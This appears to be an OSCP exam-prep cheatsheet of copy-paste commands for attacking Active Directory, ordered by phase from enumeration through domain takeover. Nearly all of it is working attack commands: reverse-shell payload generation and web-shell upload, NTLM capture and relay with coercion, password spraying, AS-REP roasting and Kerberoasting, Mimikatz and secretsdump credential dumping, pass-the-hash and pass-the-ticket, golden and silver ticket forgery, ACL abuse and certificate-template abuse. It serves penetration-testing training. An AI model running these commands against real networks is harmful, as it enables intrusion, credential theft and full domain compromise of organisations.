# Active Directory Attacks: OSCP Cheatsheet

> *Quick copy-paste command reference organized by Active Directory attack phases.*
> *Full Methodology & Protocol Theory: [[05-Active-Directory|Active Directory Methodology]]*
> *Crucial Context: The Active Directory exam set is worth 40 points.*

---

# Active Directory Cheatsheet Navigation Matrix

> *Operational Triage: Quick-reference index to locate copy-pasteable commands for Active Directory assessment phases.*

| Attack Phase / Operational Objective | Target Technique / Tool | Methodology Section |
| :--- | :--- | :--- |
| Enumerate users, groups, and password policies without tools | Native Windows LOLBins | [[#1.1: Native Windows Commands (Living off the Land)]] |
| Advanced domain auditing and ACL inspection via PowerShell | PowerView Cmdlets | [[#1.2: PowerView Domain Enumeration]] |
| Complete domain graph data collection for BloodHound | BloodHound and SharpHound | [[#1.3: BloodHound and SharpHound Data Collection]] |
| Remote multi-protocol authentication and share enumeration | NetExec (nxc) Commands | [[#1.4: NetExec (nxc) Remote Enumeration]] |
| Query LDAP directory objects and descriptions for cleartext secrets | LDAP Anonymous & Authenticated Bind | [[#1.5: LDAP Anonymous and Authenticated Enumeration]] |
| Upload web payloads through IIS WebDAV extensions | Cadaver WebDAV Upload | [[#1.6: WebDAV Upload via Cadaver (IIS)]] |
| Capture NetNTLMv2 hashes via writable SMB shares | NTLM Theft Payloads | [[#2.1: NTLM Theft via Writable SMB Shares]] |
| Relay NTLM authentication to SMB, LDAP, or AD CS | NTLM Relay & Coercion | [[#2.2: NTLM Relay and Coercion (ntlmrelayx and PetitPotam)]] |
| Spray candidate passwords across SMB, WinRM, RDP, and Kerberos | Domain Password Spraying | [[#2.3: Domain Password Spraying]] |
| Request tickets for accounts with pre-authentication disabled | AS-REP Roasting | [[#2.4: AS-REP Roasting (Unauthenticated, Authenticated, and Targeted)]] |
| Request and extract service tickets for accounts with SPNs | Kerberoasting | [[#2.5: Kerberoasting (Standard and Targeted)]] |
| Extract cleartext passwords, NTLM hashes, and tickets from memory | Mimikatz Credential Dumping | [[#3.1: Mimikatz In-Memory Credential Dumping]] |
| Remotely dump SAM, LSA secrets, and NTDS.dit via Impacket | Impacket secretsdump | [[#3.2: Impacket secretsdump (Remote Execution)]] |
| Authenticate across network services using raw NTLM hashes | Pass-the-Hash (PtH) | [[#4.1: Pass-the-Hash (PtH)]] |
| Convert NTLM hash into Kerberos TGT ticket | Overpass-the-Hash | [[#4.2: Overpass-the-Hash (Pass-the-Key)]] |
| Inject harvested Kerberos tickets into current logon session | Pass-the-Ticket (PtT) | [[#4.3: Pass-the-Ticket (PtT)]] |
| Execute remote commands via WinRM, WMI, PsExec, and DCOM | Remote Code Execution | [[#4.4: Remote Execution (WinRM, WMI, PsExec, and DCOM)]] |
| Read managed service account password hashes | gMSA ReadGMSAPassword | [[#4.5: Group Managed Service Accounts (gMSA) - ReadGMSAPassword]] |
| Trigger NetNTLMv2 authentication via web application SSRF | Web SSRF to Responder | [[#4.6: Web SSRF to Responder (NetNTLMv2 Capture)]] |
| Escalate to SYSTEM via SeRestore or SeBackup user rights | PrivEsc on Domain Hosts | [[#4.7: SeRestorePrivilege and SeBackupPrivilege Exploitation]] |
| Coerce NetNTLMv2 authentication from MSSQL service accounts | MSSQL xp_dirtree Coercion | [[#4.8: MSSQL xp_dirtree NTLM Coercion]] |
| Replicate all domain user hashes via DRSUAPI | DCSync Attack | [[#5.1: DCSync Attack (Directory Replication)]] |
| Forge stealthy service tickets without contacting the DC | Silver Ticket Forgery | [[#5.2: Silver Ticket Forgery]] |
| Forge unrestricted domain administrative tickets using krbtgt | Golden Ticket Forgery | [[#5.3: Golden Ticket Forgery]] |
| Abuse BloodHound ACE edges (GenericAll, WriteDacl, WriteOwner) | DACL and ACL Abuse | [[#5.4: DACL and ACL Abuse]] |
| Request administrative certificates via misconfigured templates | AD CS Certificate Attacks | [[#5.5: AD CS Certificate Attacks (Certipy ESC1)]] |
| Exploit Kerberos delegation configurations | Delegation Attacks | [[#5.6: Kerberos Delegation Attacks (Constrained, Unconstrained, RBCD)]] |
| Step-by-step examination operational attack sequence | Active Directory Checklist | [[#Phase 6: Active Directory OSCP Operational Checklist]] |

---

# Phase 1: Active Directory Enumeration

## 1.1: Native Windows Commands (Living off the Land)

> *Built-in Windows binaries that execute natively on any domain-joined workstation without triggering third-party binary alerts.*

```cmd
:: Enumerate all domain users
net user /domain

:: Inspect detailed attributes for a specific domain user
net user [USERNAME] /domain

:: Enumerate all domain security groups
net group /domain

:: Enumerate members of a specific domain security group
net group "Domain Admins" /domain

:: Review domain account lockout policy (MANDATORY before password spraying!)
net accounts

:: Display current user Security Identifier (SID) (Required for Golden/Silver Tickets)
whoami /user

:: Display current user group memberships and security attributes
whoami /groups
```

---

## 1.2: PowerView Domain Enumeration

```powershell
# Launch bypass execution policy and load PowerView
powershell -ep bypass
Import-Module .\PowerView.ps1

# Enumerate domain controller and domain metadata
Get-NetDomain
Get-NetDomainController

# Enumerate user accounts and password timestamps
Get-NetUser | Select-Object cn, pwdlastset, lastlogon

# Enumerate Kerberoastable user accounts (accounts with registered SPNs)
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname

# Enumerate domain security groups and memberships
Get-NetGroup | Select-Object cn
Get-NetGroup "Domain Admins" | Select-Object member

# Enumerate domain-joined computer systems
Get-NetComputer | Select-Object dnshostname, operatingsystem

# Identify systems where current user holds local Administrator rights (CRITICAL)
Find-LocalAdminAccess

# Enumerate active network sessions (identify connected Domain Admins)
Get-NetSession -ComputerName [TARGET_HOST] -Verbose

# Enumerate accessible network shares across the domain
Find-DomainShare -CheckShareAccess

# Enumerate Access Control Lists (ACLs) for specific Active Directory objects
Get-ObjectAcl -Identity "Management Department" | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object SecurityIdentifier, ActiveDirectoryRights
Convert-SidToName S-1-5-21-...

# Enumerate registered Service Principal Names for an account
setspn -L [SERVICE_ACCOUNT]
```

---

## 1.3: BloodHound and SharpHound Data Collection

```bash
# Collect domain data remotely from Kali Linux
bloodhound-python -u [USERNAME] -p '[PASSWORD]' -d corp.local -ns [DC_IP] -c all

# Collect domain data remotely via NetExec
nxc ldap [DC_IP] -u [USERNAME] -p '[PASSWORD]' --bloodhound --collection All --dns-server [DC_IP]
```

```powershell
# Collect domain data locally on target Windows host via PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\[USER]\Desktop -OutputPrefix "audit"

# Collect domain data locally via standalone SharpHound executable
.\SharpHound.exe -c All --zipfilename loot.zip --ldapusername [USER] --ldappassword "[PASSWORD]"
```

```bash
# Exfiltrate generated zip archive to Kali via temporary SMB share
# On Kali:
impacket-smbserver share $(pwd) -smb2support

# On Target:
copy C:\Users\[USER]\Desktop\audit_*.zip \\[KALI_IP]\share\loot.zip

# Launch BloodHound GUI and ingest zip file
bloodhound-start
```

### Essential Pre-Built BloodHound Queries:
- `Shortest Paths to Domain Admins`
- `Find Principals with DCSync Rights`
- `Find Kerberoastable Users`
- `Find AS-REP Roastable Users`
- Right-click compromised account node -> `Shortest Path from Owned Principals`

---

## 1.4: NetExec (nxc) Remote Enumeration

```bash
# 1. Anonymous Null Session Enumeration
nxc smb [TARGET_IP] -u '' -p '' --shares --users --pass-pol --rid-brute

# 2. Authenticated Domain Share and User Discovery
nxc smb [DC_IP] -u [USERNAME] -p '[PASSWORD]' --shares --users

# 3. Remote Command Execution via SMB
nxc smb [TARGET_IP] -u [USERNAME] -p '[PASSWORD]' -x "whoami"
nxc smb [TARGET_IP] -u [USERNAME] -p '[PASSWORD]' -X "Get-Process"

# 4. Extract LAPS Passwords from Active Directory
nxc ldap [DC_IP] -u [USERNAME] -p '[PASSWORD]' -M laps

# 5. Extract Group Policy Preferences (GPP) Passwords from SYSVOL
nxc smb [DC_IP] -u [USERNAME] -p '[PASSWORD]' -M gpp_password

# 6. Dump Local SAM Database Hashes
nxc smb [TARGET_IP] -u Administrator -p '[PASSWORD]' --sam
```

> 💡 **NetExec Workspace Reset Tip:**
> If NetExec exhibits database caching issues: `rm -rf ~/.nxc/workspaces/default/*`

---

## 1.5: LDAP Anonymous and Authenticated Enumeration

```bash
# Enumerate all domain users via NetExec
nxc smb [DC_IP] -u [USERNAME] -p '[PASSWORD]' --users

# Dump domain users via anonymous LDAP bind
ldapsearch -x -H ldap://[DC_IP] -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description

# Search specifically for user accounts containing populated description attributes (frequently contain passwords!)
ldapsearch -x -H ldap://[DC_IP] -b "DC=corp,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description

# Authenticated LDAP search targeting user descriptions
ldapsearch -x -H ldap://[DC_IP] -D "[USERNAME]@corp.local" -w '[PASSWORD]' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description
```
> 💡 *System administrators frequently leave temporary onboarding passwords in user account description attributes.*

---

## 1.6: WebDAV Upload via Cadaver (IIS)

> *If an IIS web server exposes writable WebDAV methods (PROPFIND, PUT, MKCOL), upload an ASPX reverse shell to achieve remote execution.*

```bash
# 1. Audit WebDAV methods on target web server
curl -s -I -X OPTIONS http://[TARGET_IP]/ | grep -i "dav\|allow"

# 2. Upload ASPX payload via Cadaver
cadaver http://[TARGET_IP]/
dav:/> put shell.aspx
dav:/> exit

# 3. Trigger shell execution with Netcat listener running on Kali
# Visit: http://[TARGET_IP]/shell.aspx
```

```bash
# Generate stageless ASPX reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f aspx -o shell.aspx
```

---

# Phase 2: Credential Access and Initial Attacks

## 2.1: NTLM Theft via Writable SMB Shares

> *If write access exists on an SMB share, drop a weaponized `.lnk` file pointing to Responder on Kali to capture incoming NetNTLMv2 authentication.*

```bash
# 1. Start Responder on Kali
sudo responder -I tun0 -dwv

# 2. Generate weaponized shortcut file with ntlm_theft
python3 ntlm_theft.py -g lnk -s [KALI_IP] -f payloads

# 3. Upload shortcut to target share
smbclient //[TARGET_IP]/[SHARE_NAME] -U '[USERNAME]%[PASSWORD]' -c "put payloads/payloads.lnk"

# 4. Crack captured NetNTLMv2 hash
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```
> ⚠️ **NetNTLMv2 Cannot Be Passed Directly:**
> NetNTLMv2 network responses cannot be used in Pass-the-Hash. You must crack the hash offline or relay the handshake in real-time.

---

## 2.2: NTLM Relay and Coercion (ntlmrelayx and PetitPotam)

> *Relay captured NTLM handshakes to remote services (SMB, LDAP, AD CS) where SMB Signing is disabled.*

```bash
# 1. Configure ntlmrelayx targeting unsigned SMB host to execute commands
impacket-ntlmrelayx -t smb://[TARGET_IP] -smb2support -c "powershell -e [BASE64_PAYLOAD]"

# Option: Start SOCKS proxy to maintain interactive sessions across relayed targets
impacket-ntlmrelayx -t smb://[TARGET_IP] -smb2support -socks

# 2. Coerce authentication from target host using PetitPotam (MS-EFSRPC)
python3 PetitPotam.py [KALI_IP] [DC_IP]
python3 PetitPotam.py -u '[USERNAME]' -p '[PASSWORD]' -d corp.local [KALI_IP] [DC_IP]
```

---

## 2.3: Domain Password Spraying

> ⚠️ **MANDATORY CHECK:** Verify domain account lockout threshold (`net accounts`) before launching sprays.

```bash
# Spray single password across all accounts via SMB (Pwn3d! indicates local administrator)
nxc smb [DC_IP] -u users.txt -p 'Spring2026!' -d corp.local --continue-on-success

# Spray across WinRM (Port 5985)
nxc winrm [DC_IP] -u users.txt -p 'Spring2026!' --continue-on-success

# Spray across RDP (Port 3389)
nxc rdp [TARGET_SUBNET] -u users.txt -p 'Spring2026!' -d corp.local --continue-on-success
```

```powershell
# Windows Local Spray: Kerbrute Pre-Authentication (Fastest, 2 UDP packets per attempt)
.\kerbrute_windows_amd64.exe passwordspray -d corp.local .\usernames.txt "Spring2026!"
```

---

## 2.4: AS-REP Roasting (Unauthenticated, Authenticated, and Targeted)

> *Targets accounts configured with Kerberos Pre-Authentication disabled (`DONT_REQUIRE_PREAUTH`).*

```bash
# 1. Remotely harvest AS-REP hashes from Kali Linux
impacket-GetNPUsers corp.local/[USERNAME] -dc-ip [DC_IP] -request -outputfile hashes.asreproast

# 2. Offline hash cracking via Hashcat
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

```powershell
# 3. Local execution on target Windows host via Rubeus
.\Rubeus.exe asreproast /nowrap /outfile:hashes.asreproast
```

### Targeted AS-REP Roasting (Requires `GenericWrite` or `GenericAll` over Target User):
```powershell
# 1. Disable Kerberos pre-authentication on target user
Set-DomainObject -Identity [TARGET_USER] -XOR @{useraccountcontrol=4194304}

# 2. Request AS-REP ticket from Kali via GetNPUsers.py

# 3. Re-enable pre-authentication to restore original configuration
Set-DomainObject -Identity [TARGET_USER] -XOR @{useraccountcontrol=4194304}
```

---

## 2.5: Kerberoasting (Standard and Targeted)

> *Targets service accounts holding registered Service Principal Names (SPNs).*
> ⚠️ Machine accounts (`COMPUTER$`) have 120+ character random passwords and cannot be cracked. Target human-managed service accounts.

```bash
# 1. Harvest Kerberoastable hashes remotely from Kali Linux
impacket-GetUserSPNs corp.local/[USERNAME]:'[PASSWORD]' -dc-ip [DC_IP] -request -outputfile hashes.kerberoast

# Address clock skew errors by synchronizing system time:
# sudo ntpdate [DC_IP]

# 2. Offline hash cracking via Hashcat
# Mode 13100 (RC4-HMAC):
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mode 19700 (AES256):
hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

```powershell
# 3. Local execution on target Windows host via Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

### Targeted Kerberoasting (Requires `GenericWrite` or `GenericAll` over Target User):
```powershell
# 1. Inject arbitrary SPN into targeted user account
Set-DomainObject -Identity [TARGET_USER] -Set @{serviceprincipalname='fake/service'}

# 2. Request Kerberos service ticket from Kali via GetUserSPNs.py

# 3. Remove injected SPN post-extraction
Set-DomainObject -Identity [TARGET_USER] -Clear serviceprincipalname
```

---

# Phase 3: Credential Dumping

## 3.1: Mimikatz In-Memory Credential Dumping

> *Requires local Administrator privileges and `SeDebugPrivilege`.*

```cmd
:: Launch Mimikatz and enable debug privilege
mimikatz.exe
privilege::debug

:: Extract cleartext passwords and NTLM hashes from LSASS memory
sekurlsa::logonpasswords

:: Enumerate active Kerberos tickets in memory
sekurlsa::tickets

:: Export active Kerberos tickets to disk (.kirbi format)
sekurlsa::tickets /export

:: Dump local SAM database hashes
lsadump::sam

:: Execute DCSync against Domain Controller
lsadump::dcsync /domain:corp.local /user:corp\Administrator

:: Extract krbtgt NTLM hash and Domain SID on the DC
lsadump::lsa /patch
```

---

## 3.2: Impacket secretsdump (Remote Execution)

```bash
# Full DCSync against Domain Controller
impacket-secretsdump corp.local/[ADMIN]:'[PASSWORD]'@[DC_IP]

# DCSync targeting a specific domain user
impacket-secretsdump -just-dc-user Administrator corp.local/[ADMIN]:'[PASSWORD]'@[DC_IP]

# DCSync using Pass-the-Hash
impacket-secretsdump -hashes :[NTLM_HASH] corp.local/Administrator@[DC_IP]

# Dump local SAM and LSA secrets from compromised domain workstation
impacket-secretsdump corp.local/[LOCAL_ADMIN]:'[PASSWORD]'@[TARGET_IP]
```

---

# Phase 4: Lateral Movement and Privilege Escalation

## 4.1: Pass-the-Hash (PtH)

> *Authenticate across network services using raw NTLM hashes. Pass-the-Hash succeeds against local Administrator accounts (RID 500) and domain accounts belonging to the local Administrators group.*

```bash
# Impacket WMIExec (Recommended: process execution with zero disk writes)
impacket-wmiexec -hashes :[NTLM_HASH] corp.local/[USER]@[TARGET_IP]

# Impacket PsExec (Spawns SYSTEM shell via SMB service creation)
impacket-psexec -hashes :[NTLM_HASH] corp.local/[USER]@[TARGET_IP]

# Impacket SMBExec
impacket-smbexec -hashes :[NTLM_HASH] corp.local/[USER]@[TARGET_IP]

# Evil-WinRM (Port 5985)
evil-winrm -i [TARGET_IP] -u [USER] -H [NTLM_HASH]

# NetExec verification across multiple hosts
nxc smb targets.txt -u [USER] -H [NTLM_HASH] --shares
nxc winrm targets.txt -u [USER] -H [NTLM_HASH]
```

---

## 4.2: Overpass-the-Hash (Pass-the-Key)

> *Convert an NTLM hash into a valid Kerberos Ticket Granting Ticket (TGT) to interact with Kerberos-enforced services.*

```powershell
# Mimikatz: Inject NTLM hash and spawn elevated PowerShell session
mimikatz # sekurlsa::pth /user:[TARGET_USER] /domain:corp.local /ntlm:[NTLM_HASH] /run:powershell

# Trigger ticket generation by querying network share
net use \\[TARGET_HOST]\C$
klist

# Execute commands via PsExec using active Kerberos ticket
.\PsExec.exe \\[TARGET_HOST] cmd
```

```bash
# Kali Linux: Request TGT via Impacket and export credential cache
impacket-getTGT corp.local/[USER] -hashes :[NTLM_HASH] -dc-ip [DC_IP]
export KRB5CCNAME=[USER].ccache
impacket-psexec -k -no-pass corp.local/[USER]@[TARGET_HOST]
```

---

## 4.3: Pass-the-Ticket (PtT)

> *Inject harvested Kerberos `.kirbi` or `.ccache` tickets into current sessions.*

```powershell
# 1. Export memory tickets via Mimikatz (Admin required)
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# 2. Inject exported ticket into current session
mimikatz # kerberos::ptt [TICKET_FILE].kirbi

# 3. Verify injected ticket
klist
Get-ChildItem -Path \\[TARGET_HOST]\C$
```

---

## 4.4: Remote Execution (WinRM, WMI, PsExec, and DCOM)

### WinRM and WinRS
```cmd
winrs -r:[TARGET_IP] -u:corp\[USER] -p:'[PASSWORD]' "cmd /c whoami"
winrs -r:[TARGET_IP] -u:corp\[USER] -p:'[PASSWORD]' "powershell -ep bypass -enc [BASE64]"
```

```powershell
# PowerShell Remoting via PSCredential
$cred = New-Object System.Management.Automation.PSCredential('corp\[USER]', (ConvertTo-SecureString '[PASSWORD]' -AsPlainText -Force))
Enter-PSSession -ComputerName [TARGET_IP] -Credential $cred
```

### WMI (CIM Session Execution)
```powershell
$cred = New-Object System.Management.Automation.PSCredential('corp\[USER]', (ConvertTo-SecureString '[PASSWORD]' -AsPlainText -Force))
$opt = New-CimSessionOption -Protocol DCOM
$sess = New-CimSession -ComputerName [TARGET_IP] -Credential $cred -SessionOption $opt
Invoke-CimMethod -CimSession $sess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell -nop -w hidden -enc [BASE64]"}
```

### PsExec (SysInternals)
```powershell
.\PsExec64.exe -i \\[TARGET_IP] -u corp\[USER] -p '[PASSWORD]' cmd
.\PsExec.exe \\[TARGET_HOST] cmd    # If already authenticated via Kerberos ticket
```

### DCOM (MMC20.Application)
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "[TARGET_IP]"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -enc [BASE64]", "7")
```

---

## 4.5: Group Managed Service Accounts (gMSA) - ReadGMSAPassword

> *If BloodHound reveals `ReadGMSAPassword` rights on a gMSA account, extract its NT password hash directly.*

```powershell
# Enumerate gMSA accounts and authorized retrieval accounts
Get-ADServiceAccount -Filter * -Properties * | Select-Object SamAccountName, PrincipalsAllowedToRetrieveManagedPassword

# Extract gMSA NT password hash locally via PowerShell
Import-Module .\Invoke-GMSAPasswordReader.ps1
Invoke-GMSAPasswordReader -Command "--AccountName [SVC_ACCOUNT$]"
# Use recovered rc4_hmac (= NT Hash) with Pass-the-Hash
```

```bash
# Extract gMSA password hash remotely via NetExec
nxc ldap [DC_IP] -u [USERNAME] -p '[PASSWORD]' --gmsa
```

---

## 4.6: Web SSRF to Responder (NetNTLMv2 Capture)

```bash
# 1. Start Responder on Kali
sudo responder -I tun0 -dwv

# 2. Trigger HTTP request to Kali IP via web application SSRF
curl -s "http://[TARGET_IP]:[PORT]/?url=http://[KALI_IP]"

# 3. Crack captured NetNTLMv2 hash using Hashcat mode 5600
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

---

## 4.7: SeRestorePrivilege and SeBackupPrivilege Exploitation

### SeRestorePrivilege: Utilman Hijacking
```powershell
# 1. Replace Utilman.exe with cmd.exe in System32
cd C:\Windows\System32
ren Utilman.exe Utilman.old
Copy-Item cmd.exe Utilman.exe -Force

# 2. Connect via RDP to logon screen
# xfreerdp /v:[TARGET_IP] /u:dummy
# 3. Click Ease of Access icon (or press Win + U) to spawn an elevated NT AUTHORITY\SYSTEM console.
```

### SeBackupPrivilege: Registry Hive Dumping
```powershell
# 1. Save SAM and SYSTEM hives to disk
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# 2. Exfiltrate to Kali and parse hashes:
# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
# Pass recovered Administrator NTLM hash to compromise DC
```

---

## 4.8: MSSQL xp_dirtree NTLM Coercion

```bash
# 1. Start Responder on Kali
sudo responder -I tun0 -dwv

# 2. From mssqlclient console, execute xp_dirtree to trigger SMB authentication
SQL> EXEC master..xp_dirtree '\\[KALI_IP]\share', 1, 1;
# Responder captures NetNTLMv2 hash of MSSQL service account
```

---

# Phase 5: Domain Takeover and Persistence

## 5.1: DCSync Attack (Directory Replication)

```bash
# Dump all domain hashes via Impacket
impacket-secretsdump corp.local/[ADMIN]:'[PASSWORD]'@[DC_IP]

# Dump specific high-value accounts (avoids generating excessive traffic)
impacket-secretsdump -just-dc-user Administrator corp.local/[ADMIN]:'[PASSWORD]'@[DC_IP]
impacket-secretsdump -just-dc-user krbtgt corp.local/[ADMIN]:'[PASSWORD]'@[DC_IP]
```

```powershell
# Execute DCSync locally via Mimikatz
mimikatz # lsadump::dcsync /domain:corp.local /user:corp\Administrator
mimikatz # lsadump::dcsync /domain:corp.local /user:corp\krbtgt
```

---

## 5.2: Silver Ticket Forgery

> *Forges a service ticket (`TGS`) directly using the target service account NTLM hash. Completely bypasses the Domain Controller.*
> ⚠️ The `/user:` parameter MUST specify an active, existing domain account to satisfy PAC validation.

```powershell
# Forge Silver Ticket for HTTP service on IIS web server
mimikatz # kerberos::golden /sid:[DOMAIN_SID] /domain:corp.local /target:web01.corp.local /service:http /rc4:[SERVICE_NTLM_HASH] /user:Administrator /ptt

# Validate ticket injection and test access
klist
Invoke-WebRequest -UseDefaultCredentials -Uri http://web01.corp.local
```

```bash
# Forge Silver Ticket on Linux via Impacket
impacket-ticketer -domain corp.local -domain-sid [DOMAIN_SID] -nthash [SERVICE_NTLM_HASH] -spn CIFS/web01.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass corp.local/Administrator@web01.corp.local
```

---

## 5.3: Golden Ticket Forgery

> *Forges a Ticket Granting Ticket (`TGT`) using the `krbtgt` account NTLM hash, granting persistent, unrestricted domain administrator access.*
> ⚠️ Always resolve hosts using **DNS hostnames** (`\\dc01.corp.local`), never raw IPs.

```powershell
# 1. Extract krbtgt hash and Domain SID on the DC
mimikatz # lsadump::lsa /patch

# 2. Purge existing tickets
mimikatz # kerberos::purge

# 3. Forge and inject Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_HASH] /ptt

# 4. Spawn elevated command prompt
mimikatz # misc::cmd

# 5. Access Domain Controller administrative shares
dir \\dc01.corp.local\C$
PsExec.exe \\dc01.corp.local cmd.exe
```

---

## 5.4: DACL and ACL Abuse

### `GenericAll` on User Object -> Password Reset
```powershell
net user [TARGET_USER] 'P@ssw0rd123!' /domain
Set-DomainUserPassword -Identity [TARGET_USER] -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)
```
```bash
# From Kali Linux via bloodyAD
bloodyAD -d corp.local -u [MY_USER] -p '[MY_PASS]' --host [DC_IP] set password [TARGET_USER] 'P@ssw0rd123!'
```

### `GenericAll` on Group Object -> Add Account to Group
```powershell
net group "Domain Admins" [MY_USER] /add /domain
Add-DomainGroupMember -Identity "Domain Admins" -Members "[MY_USER]"
```

### `GenericWrite` -> Targeted Kerberoasting via SPN Injection
```powershell
# Add arbitrary SPN
Set-DomainObject -Identity [TARGET_USER] -Set @{serviceprincipalname='fake/spn'}

# Request TGS ticket from Kali via GetUserSPNs.py

# Remove injected SPN post-extraction
Set-DomainObject -Identity [TARGET_USER] -Clear serviceprincipalname
```

### `WriteDacl` -> Assign Self `GenericAll` Rights
```powershell
Add-DomainObjectAcl -TargetIdentity [TARGET_USER] -PrincipalIdentity [MY_USER] -Rights All
```

### `WriteOwner` -> Ownership Hijacking
```powershell
Set-DomainObjectOwner -Identity [TARGET_USER] -OwnerIdentity [MY_USER]
Add-DomainObjectAcl -TargetIdentity [TARGET_USER] -PrincipalIdentity [MY_USER] -Rights All
```

### `ForceChangePassword` -> Administrative Reset
```powershell
net user [TARGET_USER] 'P@ssw0rd123!' /domain
```

---

## 5.5: AD CS Certificate Attacks (Certipy ESC1)

```bash
# 1. Enumerate vulnerable certificate templates across the domain
certipy find -u [USERNAME]@corp.local -p '[PASSWORD]' -dc-ip [DC_IP] -vulnerable -stdout

# 2. Request certificate specifying Domain Administrator Subject Alternative Name (UPN)
certipy req -u [USERNAME]@corp.local -p '[PASSWORD]' -dc-ip [DC_IP] \
  -ca '[CA_NAME]' -template '[VULNERABLE_TEMPLATE]' \
  -upn Administrator@corp.local

# 3. Authenticate using requested PFX certificate to extract Administrator NT hash
certipy auth -pfx administrator.pfx -dc-ip [DC_IP]
```

---

## 5.6: Kerberos Delegation Attacks (Constrained, Unconstrained, RBCD)

```bash
# Unconstrained Delegation: Harvest TGT from compromised host LSASS after coerced DC authentication
# Coerce DC: python3 printerbug.py corp.local/[USER]:'[PASS]'@[DC_IP] [UNCONSTRAINED_IP]
# In active Rubeus monitor: .\Rubeus.exe ptt /ticket:[BASE64_DC_TGT]
# Execute DCSync: impacket-secretsdump -k -no-pass corp.local/DC01\$@dc01.corp.local

# Constrained Delegation (S4U2Self + S4U2Proxy via Impacket getST)
impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator \
  corp.local/[SVC_USER]:'[PASSWORD]' -dc-ip [DC_IP]

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
```

```powershell
# Constrained Delegation via Rubeus
.\Rubeus.exe s4u /user:[SVC_USER] /rc4:[SVC_NTLM_HASH] /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt
```

---

# Phase 6: Active Directory OSCP Operational Checklist

```text
=== PHASE 1: ENUMERATION ===
[ ] net user /domain  AND  net group /domain
[ ] net accounts (Review lockout policy BEFORE spraying!)
[ ] nxc smb [TARGET_IP] -u '' -p '' --shares --users --pass-pol --rid-brute
[ ] PowerView: Find-LocalAdminAccess  AND  Get-NetUser -SPN
[ ] SharpHound -> Ingest into BloodHound -> Analyze shortest paths to DA

=== PHASE 2: CREDENTIAL ATTACKS ===
[ ] Password Spraying (nxc smb/winrm/rdp --continue-on-success)
[ ] AS-REP Roasting (GetNPUsers.py -> Hashcat 18200)
[ ] Kerberoasting (GetUserSPNs.py -> Hashcat 13100)
[ ] If GenericWrite discovered -> Execute Targeted Kerberoasting via SPN injection

=== PHASE 3: CREDENTIAL EXTRACTION ===
[ ] Mimikatz: privilege::debug; sekurlsa::logonpasswords
[ ] Mimikatz: sekurlsa::tickets /export (Kerberos tickets)
[ ] Remote secretsdump via Impacket (SAM, LSA secrets, and NTDS.dit)
[ ] MSSQL xp_dirtree -> Responder NetNTLMv2 coercion

=== PHASE 4: LATERAL MOVEMENT ===
[ ] Pass-the-Hash (impacket-wmiexec -hashes / evil-winrm -H)
[ ] Overpass-the-Hash (sekurlsa::pth -> PsExec)
[ ] Pass-the-Ticket (kerberos::ptt [TICKET].kirbi)
[ ] gMSA Account: ReadGMSAPassword -> PtH with recovered NT hash
[ ] SeRestorePrivilege -> Utilman hijacking via RDP
[ ] SeBackupPrivilege -> reg save SAM/SYSTEM -> secretsdump LOCAL -> PtH
[ ] GenericAll / ForceChangePassword -> Reset target user password

=== PHASE 5: DOMAIN DOMINANCE & PROOFS ===
[ ] DCSync Attack (secretsdump.py / lsadump::dcsync)
[ ] Golden Ticket Forgery using recovered krbtgt hash
[ ] Establish administrative shell on DC (evil-winrm / psexec)
[ ] Capture proof.txt flag on EVERY machine (Client 1, Client 2, and DC)
```
